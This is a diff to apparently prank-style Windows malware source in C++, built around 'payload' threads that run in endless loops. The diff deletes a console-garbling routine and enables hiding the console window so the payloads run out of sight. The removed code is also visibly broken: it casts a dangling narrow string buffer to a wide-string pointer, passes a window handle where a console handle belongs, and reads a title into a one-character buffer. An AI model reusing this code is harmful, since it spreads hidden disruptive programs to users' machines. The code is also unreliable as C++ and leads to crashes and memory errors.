@@ -241,80 +241,9 @@ static void run_payload(int seconds, LPTHREAD_START_ROUTINE function) {
     TerminateThread(threadhandle, 0);
 }
 
-static const wchar_t* uuid() {
-    std::random_device rd;
-    std::mt19937 gen(rd());
-    std::uniform_int_distribution<> dis(0, 15);
-    const char* hex_chars = "0123456789abcdef";
-    std::string uuid = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
-    for (char& c : uuid) {
-        if (c == 'x') {
-            c = hex_chars[dis(gen)];
-        }
-        else if (c == 'y') {
-            c = hex_chars[(dis(gen) & 0x3) | 0x8];
-        }
-    }
-    return (LPCWSTR)uuid.c_str();
-}
-
-static void ansi_rand() {
-    const char* ansi[3][MAXCHAR] = {
-        {"\x1b[0m", "\x1b[1m", "\x1b[4m", "\x1b[5m", "\x1b[7m"},
-        {"\x1b[30m", "\x1b[31m", "\x1b[32m", "\x1b[33m", "\x1b[34m", "\x1b[35m", "\x1b[36m", "\x1b[37m"},
-        {"\x1b[40m", "\x1b[41m", "\x1b[42m", "\x1b[43m", "\x1b[44m", "\x1b[45m", "\x1b[46m", "\x1b[47m"}
-    };
-    std::cout << ansi[0][0];
-    std::cout << ansi[0][rand() % 4 + 1] << ansi[1][rand() % 8] << ansi[2][rand() % 8];
-}
-
-static void console() {
-    for (;;) {
-        SetConsoleTitle(uuid());
-        WCHAR title;
-        GetConsoleTitle(&title, MAXDWORD);
-        LPCWSTR corrupt = uuid();
-        for (const wchar_t* p = corrupt; *p != L'\0'; ++p) {
-            ansi_rand();
-            std::cout << static_cast<unsigned int>(*p) << " ";
-            ansi_rand();
-            uint8_t temp = (sin(100 * 3.141592653589793f / 3434645 * 261.625565) + 1) * 127;
-            std::cout << temp;
-            ansi_rand();
-            temp = (374357 * 5 & 2454126 >> 7) | (2457568 * 3 & 256346 >> 10);
-            std::cout << temp;
-            for (int t = 0; t < 10; t++) {
-                randomize();
-                ansi_rand();
-                std::cout << (uint8_t)((sin(t * 2 * 3.14159265358f / 8000 * 261.625565) + 1) * 127);
-                ansi_rand();
-                std::cout << (uint8_t)((t * 5 & t >> 7) | (t * 3 & t >> 10));
-                ansi_rand();
-                std::cout << (uint8_t)(sin(t << rand() % 2000) * (3 + cos(t) * sin(t ^ 2)) * sin(30) - log(t));
-            }
-            std::cout << uuid();
-        }
-    }
-}
-
-static bool term() {
-    HKEY hKey;
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wt.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return true;
-    }
-    return false;
-}
-
 int main() {
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
-    //FreeConsole();
-    DWORD mode;
-    GetConsoleMode(GetConsoleWindow(), &mode);
-
-    if ((mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING) || term()) {
-        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)console, 0, 0, 0);
-    }
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    FreeConsole();
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)invert, 0, 0, 0);
     int time = 25;
     for (;;) {
